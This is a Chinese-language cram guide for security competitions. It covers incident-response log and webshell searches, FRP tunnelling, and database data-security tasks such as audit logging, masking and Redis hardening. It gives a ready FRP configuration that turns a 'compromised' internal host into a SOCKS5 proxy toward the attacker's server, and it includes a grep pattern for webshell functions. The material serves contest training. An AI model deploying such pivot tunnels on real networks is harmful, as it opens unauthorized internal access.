# 24小时极限生存指南：综合实战与数据安全速成

## 0. 核心战略：二八定律，战略性放弃
你只有 24 小时，**绝对不要**去学什么内存取证（Volatility）、内核级 Rootkit、汇编逆向。这些东西你一天绝对学不会，而且赛场上占比只有 20%。
你需要拿下的是剩下 80% 的“高频基础分”。

这 24 小时你只需要背诵并练习以下三个板块的**操作模板**：

---

## 1. 应急响应极限速成：只抓日志和文件
**[Incident Response (应急响应)](https://en.wikipedia.org/wiki/Computer_security_incident_management)** 赛题通常会问你：黑客的 IP 是什么？什么时候进来的？留了什么后门？

### 背诵这两条命脉命令：
1. **日志排查（查 SQL 注入/暴力破解源头 IP）**：
   ```bash
   # 提取 access.log 中访问量最高的前 10 个 IP。赛场上如果有个 IP 访问了几万次，99% 就是黑客。
   awk '{print $1}' /var/log/nginx/access.log | sort | uniq -c | sort -nr | head -n 10
   # 查看可疑 IP 到底请求了什么（比如发现了 192.168.1.100 是黑客）
   grep "192.168.1.100" /var/log/nginx/access.log
   ```
2. **文件排查（找 WebShell 木马）**：
   ```bash
   # 查找网站目录 /var/www/html 下，最近 24 小时内被修改过的所有 php 文件
   find /var/www/html -name "*.php" -mtime -1
   # 查找包含高危函数（如 eval, system, base64_decode）的文件
   grep -Rn "eval(" /var/www/html
   ```

## 2. 渗透组网极限速成：FRP 无脑套用
组网和内网穿透只需要会用 **FRP**。不要管它底层怎么工作的，记住配置模板。
1. **外网服务器（你的电脑或 VPS）作为 Server端**：
   `frps.ini` 配置：
   ```ini
   [common]
   bind_port = 7000
   ```
   运行：`./frps -c ./frps.ini`
2. **内网被攻陷的靶机作为 Client端**：
   `frpc.ini` 配置：
   ```ini
   [common]
   server_addr = 你的服务器IP
   server_port = 7000

   [plugin_socks5]
   type = tcp
   remote_port = 1080
   plugin = socks5
   ```
   运行：`./frpc -c ./frpc.ini`
**结果**：你只需要在本地把浏览器的代理设置为 `socks5://你的服务器IP:1080`，你就能直接访问内网靶场了！

## 3. 数据安全 (Data Security) 极限速成
数据安全在 CTF 或综合实战中，考点极其固定。万变不离其宗的是 **[CIA 三要素](https://en.wikipedia.org/wiki/Information_security#CIA_triad)**：机密性（Confidentiality）、完整性（Integrity）、可用性（Availability）。

### 实战考核的三个经典例子（从易到难）：

**例子1（简单）：敏感数据防泄露与审计**
*   **场景**：让你配置数据库的审计日志，或者找出哪个账号窃取了个人信息。
*   **速成行动**：立刻去查 MySQL 的 `general_log`。开启它：`SET GLOBAL general_log = 'ON';`。然后通过查日志，找到哪条 SQL 语句执行了 `SELECT * FROM users WHERE id_card IS NOT NULL`。直接把执行这条语句的源 IP 提交就是答案。

**例子2（复杂）：数据脱敏 (Data Masking) 与访问控制**
*   **场景**：系统要求“测试环境不能看到用户的真实手机号和身份证号”，你需要对数据库进行安全改造。
*   **速成行动**：你不能直接删数据（破坏可用性），你需要用 SQL 写**视图 (View)** 或者利用 `REPLACE`、`SUBSTRING` 函数进行脱敏，例如：
    `SELECT CONCAT(SUBSTRING(phone, 1, 3), '****', SUBSTRING(phone, 8, 4)) FROM users;`。把这个结果反馈给测试应用。

**例子3（地狱坑点）：过度防御导致业务瘫痪**
*   **场景**：题目要求你保护内网的 Redis 数据库不被未授权访问泄露数据。
*   **你的操作**：你聪明地在 Linux 上敲了 `iptables -A INPUT -p tcp --dport 6379 -j DROP`，把 Redis 端口全封了。
*   **坑点爆发**：恭喜你，数据安全了，但因为你的 Web 服务器也连不上 Redis，导致整个靶机业务彻底瘫痪（破坏了可用性）。比赛直接扣大分。
*   **正确做法**：绑定本地接口 `bind 127.0.0.1` 并且一定要**设置复杂的鉴权密码** `requirepass`，而不是粗暴地封锁网络！数据安全绝不等于拔网线。
